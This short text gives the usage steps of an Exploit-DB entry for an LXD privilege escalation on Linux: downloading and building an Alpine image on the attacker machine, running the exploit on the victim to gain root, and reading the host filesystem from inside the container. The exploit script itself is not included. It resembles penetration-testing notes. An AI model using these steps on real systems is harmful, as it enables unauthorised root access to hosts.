
https://www.exploit-db.com/exploits/46978

sh
#Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]
#Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]
#Step 3: Run this script and you will get root [Victim Machine]
#Step 4: Once inside the container, navigate to /mnt/root to see all resources    
           from the host machine
